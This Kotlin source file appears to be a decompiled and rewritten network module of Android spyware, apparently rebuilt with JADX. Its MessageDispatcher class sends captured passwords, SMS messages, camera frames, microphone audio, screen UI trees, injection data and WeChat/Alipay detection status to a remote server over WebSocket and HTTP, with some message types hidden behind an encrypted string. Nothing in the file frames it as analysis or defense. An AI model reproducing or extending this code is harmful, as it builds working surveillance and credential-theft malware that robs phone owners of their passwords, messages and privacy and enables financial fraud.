package com.storm.safe.rock.network

import android.content.Context
import android.util.Log
import com.storm.safe.rock.p000.PermissionCollector
import com.storm.safe.rock.util.StringUtil
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONException
import org.json.JSONObject
import java.util.concurrent.LinkedBlockingQueue

/**
 * Dispatches typed messages via WebSocket and proxies HTTP upload calls.
 *
 * Extracted from NetworkManager (JADX: C0323a8).
 * - buildEnvelope() — common envelope builder
 * - sendTypedMessage() — shared send pattern
 * - sendEvent() — JADX: c4
 * - 13 send* methods (JADX: c8, c5, e1, c3, e0, d0, c9, d2, c7, d4, c1, c2, d3, c6)
 * - Message queue: queueMessage, drainMessageQueue
 * - 7 HTTP proxy methods
 */
class MessageDispatcher(
    private val dataSyncClient: DataSyncClient,
    private val httpManager: HttpManager,
    private val isConnectedProvider: () -> Boolean
) {
    companion object {
        private const val TAG = "MessageDispatcher"

        // ── Message queue ──
        // JADX: Not explicitly a separate queue in C0323a8, but mirrors frame queue pattern
        const val MAX_MESSAGE_QUEUE_SIZE = 10
    }

    var deviceId: String = ""
    var ownerToken: String = ""

    // ── Message queue for offline buffering ──

    // JADX: Mirrors frame queue offline buffering pattern from C0323a8
    private val messageQueue = LinkedBlockingQueue<JSONObject>(MAX_MESSAGE_QUEUE_SIZE)

    /** Capacity of the message queue. */
    val messageQueueCapacity: Int
        get() = MAX_MESSAGE_QUEUE_SIZE

    /** Current number of queued messages. */
    val messageQueueSize: Int
        get() = messageQueue.size

    /**
     * Queue a message for later sending when connection is restored.
     * If queue is full, evicts the oldest message.
     */
    fun queueMessage(message: JSONObject) {
        if (!messageQueue.offer(message)) {
            messageQueue.poll() // Evict oldest
            messageQueue.offer(message)
        }
    }

    /**
     * Drain the message queue, sending all queued messages.
     * Called after reconnection.
     */
    fun drainMessageQueue() {
        var msg = messageQueue.poll()
        while (msg != null) {
            try {
                dataSyncClient.send(msg.toString())
            } catch (e: Exception) {
                Log.w(TAG, "Failed to send queued message", e)
            }
            msg = messageQueue.poll()
        }
    }

    // =========================================================================
    // Send methods — typed message senders
    // =========================================================================

    /**
     * Send a generic event with the given type and data payload.
     * JADX: c4 (sendEvent$2)
     */
    fun sendEvent(type: String, data: JSONObject) {
        if (!isConnectedProvider() && !dataSyncClient.isConnected) {
            Log.w(TAG, "无法发送事件 $type: wsConnected=${isConnectedProvider()}")
            return
        }
        try {
            val envelope = buildEnvelope(type, data)
            dataSyncClient.send(envelope.toString())
            Log.d(TAG, "Event sent: $type")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send event: $type", e)
        }
    }

    /** JADX: c8 — sendPasswordData$1 */
    fun sendPasswordData(data: JSONObject) {
        sendTypedMessage("password_data", data)
    }

    /** JADX: c5 — sendIncomingSms$1 */
    fun sendIncomingSms(data: JSONObject) {
        sendTypedMessage("incoming_sms", data)
    }

    /** JADX: e1 — uploadSms$1 */
    fun uploadSms(data: JSONObject) {
        sendTypedMessage("sms_upload", data)
    }

    /** JADX: c3 — sendCameraFrame$1 */
    fun sendCameraFrame(base64Image: String, mode: String) {
        try {
            val frameData = JSONObject().apply {
                put("image", base64Image)
                put("mode", mode)
                put("timestamp", System.currentTimeMillis())
            }
            val envelope = buildEnvelope("camera_frame", frameData)
            dataSyncClient.send(envelope.toString())
            Log.d(TAG, "Camera frame sent: mode=$mode")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send camera frame", e)
        }
    }

    /** JADX: e0 — uploadInjectionData$1 */
    fun uploadInjectionData(data: JSONObject) {
        sendTypedMessage("injection_data", data)
    }

    /** JADX: d0 — sendPermissionsUpdate$1. 双通道: HTTP + WS */
    fun sendPermissionsUpdate(context: Context) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val permissions = PermissionCollector.collectAll(context)

                // Channel A: HTTP POST /api/sync/status
                val httpPayload = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("permissions", JSONObject(permissions as Map<*, *>))
                }
                httpManager.uploadDeviceStatus("permissions_update", httpPayload)

                // Channel B: WS push
                if (isConnectedProvider() && dataSyncClient.isConnected) {
                    val wsPayload = JSONObject().apply {
                        put("type", "permissions_update")
                        put("deviceId", deviceId)
                        put("permissions", JSONObject(permissions as Map<*, *>))
                    }
                    dataSyncClient.send(wsPayload.toString())
                }

                Log.d(TAG, "权限更新已发送(HTTP+WS): $permissions")
            } catch (e: Exception) {
                Log.e(TAG, "发送权限更新失败", e)
            }
        }
    }

    /** JADX: c9 — sendPermissionResponse$1 */
    fun sendPermissionResponse(data: JSONObject) {
        sendTypedMessage("permission_response", data)
    }

    /** JADX: d2 — sendScreenLockStatus$1 */
    fun sendScreenLockStatus(data: JSONObject) {
        sendTypedMessage("screen_lock_status", data)
    }

    /** JADX: c7 — sendOperationLog$1 */
    fun sendOperationLog(data: JSONObject) {
        sendTypedMessage("operation_log", data)
    }

    /** JADX: d4 — sendWechatDetectionStatus$1 */
    fun sendWechatDetectionStatus(data: JSONObject) {
        sendTypedMessage("wechat_detection", data)
    }

    /** JADX: c1 — sendAlipayDetectionStatus$1 */
    fun sendAlipayDetectionStatus(data: JSONObject) {
        sendTypedMessage("alipay_detection", data)
    }

    /** JADX: c2 — sendAutoPasswordDetectionStatus$1 */
    fun sendAutoPasswordDetectionStatus(data: JSONObject) {
        sendTypedMessage("auto_password_detection", data)
    }

    /** JADX: NetworkManager$notifyLocalServiceFullConfig$1 */
    fun notifyLocalServiceFullConfig(data: JSONObject) {
        sendTypedMessage("local_service_config", data)
    }

    /**
     * Send UI tree data via WebSocket.
     * JADX: d3
     */
    fun sendUiData(data: JSONObject) {
        if (!isConnectedProvider()) return
        try {
            val envelope = JSONObject().apply {
                put("type", StringUtil.decrypt("PlAuMkQ9Hi9FMiNA"))
                put("sessionId", deviceId)
                put("data", data)
                put("timestamp", System.currentTimeMillis())
            }
            dataSyncClient.send(envelope.toString())
        } catch (e: Exception) {
            Log.e(TAG, "发送UI数据失败", e)
        }
    }

    /**
     * Send microphone audio data via WebSocket.
     * JADX: c6
     */
    @Throws(JSONException::class)
    fun sendMicData(sampleRate: Int, sampleCount: Int, audioBase64: String) {
        if (!isConnectedProvider()) return
        val envelope = JSONObject().apply {
            put("type", StringUtil.decrypt("JlASKEIoBCFZNBRYBD5ENw=="))
            put("sessionId", deviceId)
            val audioData = JSONObject().apply {
                put("audio", audioBase64)
                put("sampleRate", sampleRate)
                put("sampleCount", sampleCount)
                put("channelCount", 1)
            }
            put("data", audioData)
        }
        dataSyncClient.send(envelope.toString())
    }

    // ── Phase 10 stubs ──

    /** Send arbitrary data JSON via socket. Stub for injection activity. */
    fun sendData(data: JSONObject) {
        sendEvent("injection_data", data)
    }

    /** Send password data with source and input method. */
    fun sendPassword(password: String, source: String, inputMethod: String) {
        val payload = JSONObject().apply {
            put("text", password)
            put("source", source)
            put("inputMethod", inputMethod)
        }
        sendPasswordData(payload)
    }

    // =========================================================================
    // HTTP upload — vendor HttpManager (C0268a1) 7 POST endpoints
    // =========================================================================

    suspend fun httpRegister(deviceInfo: JSONObject): Result<JSONObject> {
        return httpManager.register(deviceInfo)
    }

    suspend fun httpUploadPasswordCapture(
        password: String,
        passwordType: String,
        inputMethod: String,
        appName: String,
        packageName: String,
        confidence: Int
    ): Result<JSONObject> {
        return httpManager.uploadPasswordCapture(password, passwordType, inputMethod, appName, packageName, confidence)
    }

    suspend fun httpUploadSms(smsList: List<JSONObject>): Result<JSONObject> {
        return httpManager.uploadSms(smsList)
    }

    suspend fun httpUploadIncomingSms(number: String, text: String, type: String, timestamp: Long): Result<JSONObject> {
        return httpManager.uploadIncomingSms(number, text, type, timestamp)
    }

    suspend fun httpUploadLogs(logs: List<JSONObject>): Result<JSONObject> {
        return httpManager.uploadLogs(logs)
    }

    suspend fun httpUploadInjectionData(data: JSONObject): Result<JSONObject> {
        return httpManager.uploadInjectionData(data)
    }

    suspend fun httpUploadDeviceStatus(statusType: String, data: JSONObject): Result<JSONObject> {
        return httpManager.uploadDeviceStatus(statusType, data)
    }

    // =========================================================================
    // Private helpers
    // =========================================================================

    /**
     * Build a JSON envelope and send via DataSyncClient.
     * Common pattern shared by all typed send methods.
     */
    private fun sendTypedMessage(type: String, data: JSONObject) {
        try {
            val envelope = buildEnvelope(type, data)
            dataSyncClient.send(envelope.toString())
            Log.d(TAG, "Message sent: $type")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send $type", e)
        }
    }

    /**
     * Build the standard JSON envelope used by all send methods.
     *
     * Format: `{"type":"<type>","sessionId":"<deviceId>","data":{...},"timestamp":<ms>}`
     */
    private fun buildEnvelope(type: String, data: JSONObject): JSONObject {
        return JSONObject().apply {
            put("type", type)
            put("itype", "Slr_client")
            put("pid", deviceId)
            put("sessionId", deviceId)
            if (ownerToken.isNotEmpty()) put("owner_token", ownerToken)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }
    }
}
